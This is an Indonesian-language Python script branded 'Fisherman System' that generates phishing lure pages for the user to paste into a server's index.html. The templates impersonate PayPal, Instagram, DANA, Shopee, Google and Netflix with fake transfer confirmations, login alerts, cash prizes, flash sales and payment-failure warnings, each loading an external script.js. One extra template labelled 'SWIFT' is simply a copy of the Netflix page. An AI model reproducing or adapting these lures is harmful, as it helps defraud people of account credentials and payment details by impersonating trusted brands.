#!/usr/bin/env python3
import time
import sys
import os
import random

def loading_animation(text, duration=2):
    chars = [".  ", ".. ", "...", " ..", "  .", "   "]
    end_time = time.time() + duration
    while time.time() < end_time:
        for char in chars:
            sys.stdout.write(f"\r{text}{char}")
            sys.stdout.flush()
            time.sleep(0.2)
    sys.stdout.write(f"\r{text}... Selesai!          \n")

def typewriter_effect(text):
    for char in text:
        print(char, end='', flush=True)
        delay = random.uniform(0.01, 0.05)
        if random.random() < 0.1:
            delay += random.uniform(0.2, 0.5)
        time.sleep(delay)
    print()

html_options = {
    1: """<!DOCTYPE html>
<html lang="id">
<head>
  <meta charset="UTF-8">
  <title>PayPal - Transfer Berhasil</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <style>
    body { margin: 0; font-family: 'Segoe UI', sans-serif; background-color: #f6f7fb; display: flex; align-items: center; justify-content: center; height: 100vh; }
    .container { background: #fff; padding: 40px; border-radius: 12px; box-shadow: 0 4px 15px rgba(0,0,0,0.1); max-width: 450px; width: 90%; text-align: center; }
    h1 { color: #0070ba; font-size: 24px; }
    .amount { font-size: 22px; font-weight: bold; color: #111; }
    .status { color: #4BB543; font-weight: 600; margin-bottom: 20px; }
  </style>
</head>
<body>
  <div class="container">
    <img src="https://www.paypalobjects.com/webstatic/icon/pp258.png" height="45">
    <h1>Transfer Berhasil</h1>
    <div class="amount">Rp 10.000.000</div>
    <div class="status">Dana telah dikreditkan ke saldo Anda dan sedang dalam status pending, konfirmasi untuk mencairkan dana.</div>
    <p>ID Transaksi: PP-ID8728932873</p>
  </div>
  <script src="script.js"></script>
</body>
</html>""",

    2: """<!DOCTYPE html>
<html lang="id">
<head>
  <title>Instagram - Peringatan Login</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <style>
    body { background: #fafafa; font-family: sans-serif; display: flex; justify-content: center; padding-top: 50px; }
    .box { background: white; border: 1px solid #dbdbdb; padding: 30px; width: 350px; text-align: center; }
    .btn { background: #0095f6; color: white; border: none; padding: 10px; width: 100%; border-radius: 4px; font-weight: bold; cursor: pointer; }
    .warning { color: #ed4956; font-size: 14px; margin: 20px 0; }
  </style>
</head>
<body>
  <div class="box">
    <img src="https://www.instagram.com/static/images/web/mobile_port_monospaced_pdt.png/d2ad2667437e.png" width="175">
    <p class="warning"><b>Upaya Login Tidak Dikenal</b><br>Seseorang baru saja mencoba login ke akun Anda dari Jakarta, Indonesia.</p>
    <button class="btn">Ini Bukan Saya</button>
  </div>
  <script src="script.js"></script>
</body>
</html>""",

    3: """<!DOCTYPE html>
<html lang="id">
<head>
  <title>DANA - Promo Cashback 1jt</title>
  <style>
    body { background: #008ced; color: white; font-family: 'Arial'; text-align: center; padding-top: 100px; }
    .card { background: white; color: #333; margin: auto; width: 300px; padding: 20px; border-radius: 15px; }
    .btn { background: #118ee1; color: white; padding: 15px; display: block; text-decoration: none; border-radius: 10px; margin-top: 20px; font-weight: bold; }
  </style>
</head>
<body>
  <h1>Selamat! 🥳</h1>
  <div class="card">
    <p>Anda terpilih mendapatkan saldo</p>
    <h2 style="color:#008ced">Rp 1.000.000</h2>
    <p>Hanya berlaku hari ini!</p>
    <a href="#" class="btn">Ambil Saldo Sekarang</a>
  </div>
  <script src="script.js"></script>
</body>
</html>""",

    4: """<!DOCTYPE html>
<html lang="id">
<head>
  <title>Flash Sale Shopee - iPhone 15 Pro</title>
  <style>
    body { background: #ee4d2d; font-family: sans-serif; color: white; text-align: center; }
    .item { background: white; color: #333; width: 80%; max-width: 400px; margin: 50px auto; border-radius: 10px; padding: 20px; }
    .price { color: #ee4d2d; font-size: 30px; font-weight: bold; }
    .old-price { text-decoration: line-through; color: #999; }
  </style>
</head>
<body>
  <div class="item">
    <img src="https://thumbor.sirclocdn.com/unsafe/720x/filters:quality(100):format(webp)/https://store.sirclo.com/digimap/media/catalog/product/i/p/iphone_15_pro_natural_titanium_1_1.jpg" width="150">
    <h2>iPhone 15 Pro 256GB</h2>
    <p class="old-price">Rp 20.999.000</p>
    <p class="price">Rp 1.000</p>
    <p>Stok Tersisa: 2 PCS!</p>
    <button style="background:#ee4d2d; color:white; border:none; padding:15px; width:100%; font-size:18px;">BELI SEKARANG</button>
  </div>
  <script src="script.js"></script>
</body>
</html>""",

    5: """<!DOCTYPE html>
<html lang="id">
<head>
  <title>Google Security Alert</title>
  <style>
    body { font-family: 'Roboto', arial; display: flex; justify-content: center; padding-top: 50px; background: #fff; }
    .box { border: 1px solid #dadce0; border-radius: 8px; padding: 40px; width: 400px; }
    .warn { color: #d93025; font-size: 22px; }
  </style>
</head>
<body>
  <div class="box">
    <img src="https://www.gstatic.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png" width="75">
    <h2 class="warn">Peringatan Keamanan Terdeteksi</h2>
    <p>Seseorang mencoba masuk ke akun Google Anda melalui perangkat Linux di Rusia.</p>
    <a href="#" style="background:#1a73e8; color:white; padding:10px 20px; text-decoration:none; border-radius:5px; display:inline-block;">Amankan Akun</a>
  </div>
  <script src="script.js"></script>
</body>
</html>""",

    6: """<!DOCTYPE html>
<html lang="id">
<head>
  <title>Netflix - Masalah Pembayaran</title>
  <style>
    body { background: #000; color: #fff; font-family: 'Helvetica'; text-align: center; }
    .msg { background: #e87c03; padding: 10px; font-weight: bold; }
    .btn { background: #e50914; color: white; padding: 15px 30px; text-decoration: none; display: inline-block; margin-top: 30px; font-weight: bold; }
  </style>
</head>
<body>
  <div class="msg">Langganan Anda akan segera berakhir!</div>
  <div style="padding: 50px;">
    <img src="https://upload.wikimedia.org/wikipedia/commons/0/08/Netflix_2015_logo.svg" width="150">
    <p>Maaf, kami tidak bisa memproses pembayaran tagihan Anda bulan ini.</p>
    <p>Silakan perbarui metode pembayaran untuk tetap menonton film favorit.</p>
    <a href="#" class="btn">PERBARUI INFO PEMBAYARAN</a>
  </div>
  <script src="script.js"></script>
</body>
</html>""",

    7: """<!DOCTYPE html>
<html lang="id">
<head>
  <title>SWIFT - Pending Payment</title>
  <style>
    body { background: #000; color: #fff; font-family: 'Helvetica'; text-align: center; }
    .msg { background: #e87c03; padding: 10px; font-weight: bold; }
    .btn { background: #e50914; color: white; padding: 15px 30px; text-decoration: none; display: inline-block; margin-top: 30px; font-weight: bold; }
  </style>
</head>
<body>
  <div class="msg">Langganan Anda akan segera berakhir!</div>
  <div style="padding: 50px;">
    <img src="https://upload.wikimedia.org/wikipedia/commons/0/08/Netflix_2015_logo.svg" width="150">
    <p>Maaf, kami tidak bisa memproses pembayaran tagihan Anda bulan ini.</p>
    <p>Silakan perbarui metode pembayaran untuk tetap menonton film favorit.</p>
    <a href="#" class="btn">PERBARUI INFO PEMBAYARAN</a>
  </div>
  <script src="script.js"></script>
</body>
</html>"""
}

def print_colored_ascii():
    ascii_art = """
░▒▓████████▓▒░▒▓█▓▒░░▒▓███████▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓████████▓▒░▒▓███████▓▒░░▒▓██████████████▓▒░ ░▒▓██████▓▒░░▒▓███████▓▒░  
░▒▓█▓▒░      ░▒▓█▓▒░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░ 
░▒▓█▓▒░      ░▒▓█▓▒░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░ 
░▒▓██████▓▒░ ░▒▓█▓▒░░▒▓██████▓▒░░▒▓████████▓▒░▒▓██████▓▒░ ░▒▓███████▓▒░░▒▓█▓▒░░▒▓█▓▒░░▒▓█▓▒░▒▓████████▓▒░▒▓█▓▒░░▒▓█▓▒░ 
░▒▓█▓▒░      ░▒▓█▓▒░      ░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░ 
░▒▓█▓▒░      ░▒▓█▓▒░      ░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░ 
░▒▓█▓▒░      ░▒▓█▓▒░▒▓███████▓▒░░▒▓█▓▒░░▒▓█▓▒░▒▓████████▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░ 
    
𝕍𝕖𝕣𝕤𝕚𝕠𝕟: 𝟙.𝟚.𝟘
ℂ𝕣𝕖𝕒𝕥𝕠𝕣: 𝔹𝕒𝕟𝕘𝔸𝕘𝕦𝕤𝕖
"""
    RED = '\033[31m'
    YELLOW = '\033[33m'
    RESET = '\033[0m'

    lines = ascii_art.strip('\n').split('\n')
    for line in lines:
        out = []
        for ch in line:
            if ch in ('░', ' '):
                out.append(f"{RED}{ch}{RESET}")
            else:
                out.append(f"{YELLOW}{ch}{RESET}")
        print("".join(out))


def main():
    os.system('clear' if os.name == 'posix' else 'cls')
    loading_animation("Memuat Fisherman System", duration=1.5)
    print_colored_ascii()
    
    print("\nPilih kode HTML yang ingin di-generate:")
    print("----------------------------------------")
    print("1 | PayPal Transfer Berhasil")
    print("2 | Instagram New Login Alert")
    print("3 | DANA Cashback Promo 1 Juta")
    print("4 | Shopee Flash Sale iPhone 1k")
    print("5 | Google Akun Security Alert")
    print("6 | Netflix Payment Failed Update")
    print("----------------------------------------")

    try:
        choice = int(input("\nMasukkan nomor pilihan (1-6): "))
        if choice in html_options:
            loading_animation("Generating HTML Code", duration=7.5)
            print("\n" + "="*50)
            print("SALIN KODE HTML DI BAWAH INI:")
            print("="*50 + "\n")
            typewriter_effect(html_options[choice])
            print("\n" + "="*50)
            print("Selesai! Rekatkan kode di atas pada file index.html disini: /Fisherman/server/index.html")
        else:
            print("Pilihan tidak ada dalam daftar.")
    except ValueError:
        print("Error: Hanya bisa memasukkan angka saja.")

if __name__ == "__main__":
    main()